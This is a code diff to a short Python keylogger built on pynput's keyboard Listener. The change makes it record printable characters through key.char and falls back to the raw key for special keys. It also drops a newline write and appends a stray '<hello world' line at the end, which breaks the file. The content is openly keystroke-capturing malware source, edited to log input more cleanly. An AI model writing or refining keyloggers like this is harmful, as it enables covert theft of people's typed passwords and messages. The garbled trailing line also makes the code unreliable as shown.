@@ -11,9 +11,12 @@ keys = []
 
 def on_press(key):
     global keys, count
-
-    print(key)
-    keys.append(key)
+    try:
+        print(key.char)
+        keys.append(key.char)
+    except AttributeError:
+        print(key)
+        keys.append(key)
     count += 1
 
     if count >= 1:
@@ -32,7 +35,6 @@ def write_file(keys):
             elif k.find("Key") == -1:
                 f.write(k)
                 f.close()
-        f.write('\n')
 
 
 def on_release(key):
@@ -43,3 +45,4 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
+<hello world
